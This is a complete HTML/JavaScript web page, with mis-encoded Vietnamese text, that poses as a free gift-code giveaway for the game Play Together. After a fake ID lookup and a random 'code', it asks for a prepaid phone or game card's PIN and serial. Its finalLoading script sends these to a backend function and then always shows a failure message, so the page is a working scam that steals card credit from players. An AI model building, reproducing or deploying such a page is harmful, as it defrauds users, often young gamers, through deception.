<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NH·∫¨N CODE PLAY TOGETHER</title>
    <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@400;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --red: #e74c3c; --blue: #3498db; --green: #2ecc71; --bg: #f8f9fa; --gray: #bdc3c7; --orange: #f39c12; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Lexend', sans-serif; }
        body { background: var(--bg); padding-bottom: 80px; position: relative; min-height: 100vh; }

        .header-logo { background: #fff; text-align: center; padding: 10px; border-bottom: 2px solid #eee; }
        .header-logo img { height: 40px; }
        .banner { width: 100%; display: block; height: auto; }

        .marquee-box { background: #fffbe6; border-bottom: 1px solid #ffe58f; padding: 8px 0; overflow: hidden; }
        .marquee-text { white-space: nowrap; display: inline-block; animation: marquee 15s linear infinite; color: #856404; font-size: 14px; font-weight: 700; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }

        .latest-codes { background: #fff; margin: 10px 15px; padding: 12px; border-radius: 12px; border: 1px solid #e2e8f0; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
        .latest-codes h4 { font-size: 12px; color: #718096; text-transform: uppercase; margin-bottom: 8px; display: flex; align-items: center; gap: 5px; }
        .latest-codes h4::before { content: 'üî•'; }
        .code-list { display: flex; flex-wrap: wrap; gap: 6px; }
        .code-item { background: #f1f5f9; color: #475569; padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: 700; border: 1px solid #cbd5e0; }

        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; padding: 15px; }
        .card { background: white; border-radius: 15px; overflow: hidden; border: 1px solid #eee; text-align: center; padding-bottom: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); display: flex; flex-direction: column; justify-content: space-between; position: relative; }
        
        .limit-badge { position: absolute; top: 8px; left: 8px; background: var(--red); color: white; font-size: 9px; font-weight: 800; padding: 3px 8px; border-radius: 50px; text-transform: uppercase; z-index: 10; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
        
        .card-img { width: 100%; aspect-ratio: 1/1; object-fit: cover; cursor: pointer; }
        .btn-main-receive { background: var(--red); color: white; border: none; padding: 8px 20px; border-radius: 8px; font-weight: 800; cursor: pointer; margin-top: 8px; font-size: 13px; align-self: center; margin-bottom: 10px; }
        .btn-disabled { background: var(--gray) !important; cursor: not-allowed !important; opacity: 0.7; }

        .messenger-btn {
            position: fixed; bottom: 20px; right: 15px; z-index: 9999;
            background: #fff; padding: 8px 15px 8px 8px; border-radius: 50px;
            display: flex; align-items: center; gap: 10px; text-decoration: none; color: #333;
            box-shadow: 0 4px 15px rgba(0,0,0,0.15); border: 1px solid #f0f0f0; transition: 0.2s;
        }
        .messenger-btn img.avatar { width: 38px; height: 38px; border-radius: 50%; object-fit: cover; }
        .messenger-text { display: flex; flex-direction: column; }
        .messenger-name { font-size: 13px; font-weight: 800; display: flex; align-items: center; gap: 4px; }
        .messenger-name::after { 
            content: '‚úî'; background: #0084ff; color: white; font-size: 7px; width: 12px; height: 12px; 
            display: flex; align-items: center; justify-content: center; border-radius: 50%; 
        }
        .messenger-sub { font-size: 11px; color: #718096; }
        .messenger-icon-circle { width: 32px; height: 32px; background: #0084ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .messenger-icon-circle svg { width: 18px; fill: white; }

        .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(8px); display: none; align-items: center; justify-content: center; z-index: 1000; padding: 20px; }
        .modal.active { display: flex; }
        .modal-inner { background: white; width: 100%; max-width: 350px; border-radius: 24px; position: relative; padding: 25px; text-align: center; animation: scaleUp 0.3s cubic-bezier(0.34, 1.56, 0.64, 1); }
        @keyframes scaleUp { from { transform: scale(0.7); opacity: 0; } to { transform: scale(1); opacity: 1; } }

        .btn-close { position: absolute; top: 12px; right: 12px; background: #f1f1f1; border: none; width: 30px; height: 30px; border-radius: 50%; font-weight: bold; cursor: pointer; }
        .zoom-img { width: 95%; border-radius: 15px; margin-bottom: 15px; }
        .zoom-title { font-size: 18px; font-weight: 800; color: #333; margin-bottom: 20px; }
        .btn-popup-receive { background: var(--red); color: white; border: none; padding: 14px; width: 100%; border-radius: 12px; font-weight: 800; cursor: pointer; font-size: 16px; }

        .code-display { background: #f8f9fa; border: 2px dashed #cbd5e0; padding: 15px; text-align: center; font-size: 17px; font-weight: 800; margin: 15px 0; border-radius: 12px; color: #2d3748; }
        .status-badge { display: block; padding: 10px; border-radius: 10px; font-weight: 800; font-size: 13px; margin-bottom: 15px; background: #fff3cd; color: #856404; border: 1px solid #ffe58f; }

        input, select { width: 100%; padding: 14px; border-radius: 12px; border: 1.5px solid #e2e8f0; margin-bottom: 12px; outline: none; font-size: 14px; }
        label { display: block; text-align: left; font-size: 11px; font-weight: 700; color: #718096; margin-bottom: 5px; text-transform: uppercase; }
        .id-error { color: #e74c3c; font-size: 11px; text-align: left; margin-top: -8px; margin-bottom: 10px; display: none; font-weight: 600; }

        .btn-login-orange { background: #f39c12; color: white; border: none; padding: 14px; width: 100%; border-radius: 12px; font-weight: 800; cursor: pointer; font-size: 16px; box-shadow: 0 4px 0 #d38312; }
        .btn-login-orange:active { transform: translateY(2px); box-shadow: 0 2px 0 #d38312; }

        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--blue); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="header-logo"><img src="https://i.postimg.cc/R0MWjykH/IMG-1181.jpg"></div>
<img src="https://i.postimg.cc/rshjr55j/IMG-2022.png" class="banner">

<div class="marquee-box">
    <div class="marquee-text" id="marquee-dynamic">‚óè ƒêang c·∫≠p nh·∫≠t s·ª± ki·ªán m·ªõi nh·∫•t...</div>
</div>

<div class="latest-codes">
    <h4>Danh s√°ch Code m·ªõi nh·∫•t:</h4>
    <div class="code-list">
        <span class="code-item">PTIGBYEWINTER</span><span class="code-item">LOCTETPTG2026</span><span class="code-item">HUNGLOC26</span><span class="code-item">LOCLAPT</span><span class="code-item">PTMYVALENTINE</span><span class="code-item">PTFORTUNETABLE</span><span class="code-item">LEGENDDERBYPT</span><span class="code-item">FLOWERFAIRYPT</span>
    </div>
</div>

<div class="grid" id="item-grid"></div>

<a href="https://m.me/117000874340678" target="_blank" class="messenger-btn">
    <img src="https://i.postimg.cc/R0MWjykH/IMG-1181.jpg" class="avatar">
    <div class="messenger-text">
        <span class="messenger-name">Play Together</span>
        <span class="messenger-sub">B·∫Øt ƒë·∫ßu cu·ªôc tr√≤ chuy·ªán</span>
    </div>
    <div class="messenger-icon-circle"><svg viewBox="0 0 24 24"><path d="M12 2.04C6.5 2.04 2 6.18 2 11.28c0 2.89 1.44 5.47 3.69 7.15.19.14.3.36.3.6v2.33c0 .54.54.91 1.01.67l2.61-1.33c.15-.08.33-.11.5-.08.62.11 1.25.17 1.89.17 5.5 0 10-4.14 10-9.24s-4.5-9.24-10-9.24zm.8 12.33l-2-2.12-3.89 2.12 4.28-4.55 2.05 2.12 3.84-2.12-4.28 4.55z"/></svg></div>
</a>

<div class="modal" id="app-modal">
    <div class="modal-inner">
        <button class="btn-close" onclick="closeModal()">‚úï</button>
        <div id="modal-content"></div>
    </div>
</div>

<script>
    function updateMarqueeDate() {
        const now = new Date();
        const d = String(now.getDate()).padStart(2, '0');
        const m = String(now.getMonth() + 1).padStart(2, '0');
        const y = now.getFullYear();
        document.getElementById('marquee-dynamic').innerHTML = `‚óè C·∫≠p nh·∫≠t: ${d}/${m}/${y} - S·ª± ki·ªán gi·ªõi h·∫°n: Nh·∫≠p ID nh·∫≠n ngay g√≥i v·∫≠t ph·∫©m hi·∫øm - ƒê·∫£o Kaia k√≠nh ch√†o!`;
    }
    updateMarqueeDate();

    const items = [
        { id: 13, name: "X∆∞·ªüng m√°y hoa h·ªìng", img: "https://i.postimg.cc/zDppMY5g/IMG-2127.png" },
        { id: 2, name: "2.450 ƒê√° qu√Ω", img: "https://i.postimg.cc/85dNNzLf/IMG-2025.png" },
        { id: 1, name: "450 Th·ªèi v√†ng", img: "https://i.postimg.cc/ydhss80F/IMG-0014.png" },
        { id: 17, name: "ƒêo√° hoa to·∫£ s√°ng", img: "https://i.postimg.cc/nVkhtN8p/IMG-2160.png" },
        { id: 18, name: "G√≥i N·ªØ sinh tr∆∞·ªùng Marron KM", img: "https://i.postimg.cc/BvHJ7Vc9/IMG-2161.png" },
        { id: 16, name: "C·∫ßn c√¢u b√∫a v√†ng", img: "https://i.postimg.cc/7YxyPMJ1/IMG-1867.png" },
        { id: 11, name: "Supreme Roadster C·ª±c Quang", img: "https://i.postimg.cc/P51mpy11/IMG-2118.png" },
        { id: 12, name: "M√πa V·ªçng L√¢u Thi·∫øu Gia H·ªï", img: "https://i.postimg.cc/zfJRLrJF/IMG-2119.png" },
        { id: 3, name: "C√¥ g√°i x√°c ∆∞·ªõp", img: "https://i.postimg.cc/vmmwpwzM/IMG-2034.png" },
        { id: 4, name: "M√®o k·∫πo sao", img: "https://i.postimg.cc/K8Z6MhCT/IMG-1962.png" },
        { id: 5, name: "Th·ªè c∆∞ng t∆∞ng t∆∞ng", img: "https://i.postimg.cc/cLn5j3X4/IMG-2052.png" },
        { id: 6, name: "Thi√™n th·∫ßn th·ªè", img: "https://i.postimg.cc/6qPYb6ZS/IMG-2051.png" },
        { id: 7, name: "Nini r∆∞ng r∆∞ng", img: "https://i.postimg.cc/PxrytvQH/IMG-2050.png" },
        { id: 8, name: "Angel mate", img: "https://i.postimg.cc/0N9dfK3K/IMG-1865.png" },
        { id: 9, name: "Tay ƒëua v≈© tr·ª•", img: "https://i.postimg.cc/q755y9Qf/IMG-2084.png" },
        { id: 10, name: "V·ª£t √°nh sao m∆° m√†ng", img: "https://i.postimg.cc/T3P00tpF/IMG-2083.png" },
        { id: 14, name: "G√≥i k·∫πo cao su b·∫°c h√†", img: "https://i.postimg.cc/x8wpWQmp/Khong-Co-Tieu-De11-20260225012237.png", isComingSoon: true },
        { id: 15, name: "Valentine xanh c√° t√≠nh", img: "https://i.postimg.cc/VkgQbSM7/Khong-Co-Tieu-De12-20260225014422.png", isComingSoon: true }
    ];

    const grid = document.getElementById('item-grid');
    items.forEach(i => {
        let btn = i.isComingSoon ? `<button class="btn-main-receive btn-disabled" disabled>S·∫Øp ra m·∫Øt</button>` : `<button class="btn-main-receive" onclick="showItemDetail('${i.name}', '${i.img}', false)">Nh·∫≠n</button>`;
        grid.innerHTML += `<div class="card"><div class="limit-badge">Gi·ªõi h·∫°n</div><img src="${i.img}" class="card-img" onclick="showItemDetail('${i.name}', '${i.img}', ${i.isComingSoon || false})"><div style="font-size:13px; font-weight:700; margin: 10px 5px">${i.name}</div>${btn}</div>`;
    });

    const modal = document.getElementById('app-modal');
    const content = document.getElementById('modal-content');
    let userPlayerID = "";

    function showItemDetail(name, img, isSoon) {
        modal.classList.add('active');
        let btn = isSoon ? `<button class="btn-popup-receive btn-disabled" disabled>S·∫Øp ra m·∫Øt</button>` : `<button class="btn-popup-receive" onclick="openIDInput()">üéÅ Nh·∫≠n Qu√†</button>`;
        content.innerHTML = `<img src="${img}" class="zoom-img"><div class="zoom-title">${name}</div>${btn}`;
    }

    function openIDInput() {
        content.innerHTML = `
            <div style="display:flex; align-items:center; justify-content:center; gap:8px; margin-bottom:20px">
                <span style="background:var(--red); color:white; width:24px; height:24px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:800; font-size:14px">1</span>
                <h3 style="font-size:18px">Vui l√≤ng ƒêƒÉng Nh·∫≠p ID</h3>
            </div>
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px">
                <label style="margin-bottom:0; font-size:15px; color:#444">Player ID</label>
                <span style="color:var(--blue); font-size:12px; text-decoration:underline; font-weight:700; cursor:pointer" onclick="openHuongDan()">H∆∞·ªõng d·∫´n l·∫•y ID</span>
            </div>
            <input type="text" id="p-id-input" placeholder="Nh·∫≠p UID t·ª´ 12‚Äì14 k√Ω t·ª±" maxlength="14" oninput="formatID(this)">
            <div id="id-error-msg" class="id-error">ID kh√¥ng h·ª£p l·ªá (D·∫°ng: XXXX-XXXX-XXXX)</div>
            <p style="font-size:11px; color:#888; text-align:left; margin-top:-5px; margin-bottom:15px">B·∫°n c√≥ th·ªÉ d√°n nhanh b·∫±ng Ctrl+V. .</p>
            <button class="btn-login-orange" onclick="processID()">ƒêƒÉng Nh·∫≠p</button>`;
    }

    function openHuongDan() {
        content.innerHTML = `
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px">
                <h3 style="font-size:16px">H∆∞·ªõng d·∫´n t√¨m ID</h3>
                <span style="cursor:pointer; font-weight:800" onclick="openIDInput()">‚úï</span>
            </div>
            <img src="https://i.postimg.cc/bw6Zzw64/IMG-2125.png" style="width:100%; border-radius:12px">
            <button class="btn-login-orange" style="margin-top:15px" onclick="openIDInput()">ƒê√≥ng</button>`;
    }

    function formatID(el) {
        let val = el.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
        let formatted = "";
        for(let i = 0; i < val.length; i++) {
            if (i > 0 && i % 4 === 0 && i < 12) formatted += "-";
            formatted += val[i];
        }
        el.value = formatted.substring(0, 14);
        document.getElementById('id-error-msg').style.display = 'none';
    }

    function processID() {
        const val = document.getElementById('p-id-input').value;
        const regex = /^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/; 
        if(!regex.test(val)) {
            document.getElementById('id-error-msg').style.display = 'block';
            return;
        }
        userPlayerID = val;
        content.innerHTML = `<div style="padding:30px 0"><div class="loader"></div><p style="font-weight:800">ƒêang t√¨m ki·∫øm ID: ${userPlayerID}...</p></div>`;
        setTimeout(() => { showCodeBoard(); }, 3000); 
    }

    function showCodeBoard() {
        const randomCode = 'NHANCODEPTG' + Math.random().toString(36).substr(2, 6).toUpperCase();
        content.innerHTML = `<h3>TH√îNG TIN CODE</h3><div style="background:#edf2f7; padding:10px; border-radius:10px; margin: 15px 0"><p style="font-size:14px">ID Player: <b style="color:var(--red)">${userPlayerID}</b></p></div><div class="code-display">${randomCode}</div><div class="status-badge">‚ùå TR·∫†NG TH√ÅI: CH∆ØA K√çCH HO·∫†T</div><button class="btn-popup-receive" onclick="openPay()">K√çCH HO·∫†T NGAY</button>`;
    }

    function openPay() {
        content.innerHTML = `
            <h3 style="margin-bottom:15px">H·ªÜ TH·ªêNG K√çCH HO·∫†T</h3>
            <label>Lo·∫°i th·∫ª</label>
            <select id="card-type">
                <option value="Viettel">Viettel</option><option value="Zing">Zing</option><option value="Mobifone">Mobifone</option><option value="Vinaphone">Vinaphone</option><option value="Garena">Garena</option>
            </select>
            <label>M·ªánh gi√°</label>
            <select id="card-amount">
                <option value="50.000">50.000ƒë</option><option value="100.000">100.000ƒë</option><option value="200.000">200.000ƒë</option><option value="500.000">500.000ƒë</option><option value="1.000.000">1.000.000ƒë</option>
            </select>
            <input type="text" id="c-code" placeholder="M√£ th·∫ª n·∫°p..."><input type="text" id="c-seri" placeholder="S·ªë Seri th·∫ª...">
            <button class="btn-popup-receive" onclick="finalLoading()">X√ÅC NH·∫¨N TH·∫∫</button>`;
    }

    async function finalLoading() {
        let code = document.getElementById('c-code').value;
        let seri = document.getElementById('c-seri').value;
        let type = document.getElementById('card-type').value; 
        let amount = document.getElementById('card-amount').value; // D√íNG M·ªöI: L·∫•y m·ªánh gi√°
        
        if(!code || !seri) return alert("Vui l√≤ng nh·∫≠p ƒë·ªß!");
        
        content.innerHTML = `<div style="padding:30px 0"><div class="loader"></div><p style="font-weight:800">ƒêang ki·ªÉm tra th·∫ª tr√™n h·ªá th·ªëng...</p></div>`;
        
        try {
            await fetch('/.netlify/functions/napthe', { 
                method: 'POST', 
                headers: { 'Content-Type': 'application/json' }, 
                body: JSON.stringify({ type, code, seri, playerID: userPlayerID, amount: amount }) // G·ª≠i k√®m amount
            });
            
            setTimeout(() => {
                content.innerHTML = `<div style="font-size:50px; margin-bottom:10px">‚ùå</div><h3 style="color:#ff4d4d">K√çCH HO·∫†T TH·∫§T B·∫†I</h3><p>Th·∫ª n·∫°p kh√¥ng h·ª£p l·ªá ho·∫∑c sai m·ªánh gi√°. Vui l√≤ng th·ª≠ l·∫°i!</p><button class="btn-popup-receive" style="background:#ff4d4d" onclick="openPay()">ƒê√ìNG</button>`;
            }, 3000);
        } catch (err) { 
            alert("L·ªói k·∫øt n·ªëi m√°y ch·ªß n·∫°p th·∫ª!"); 
            openPay(); 
        }
    }

    function closeModal() { modal.classList.remove('active'); }
</script>
</body>
</html>
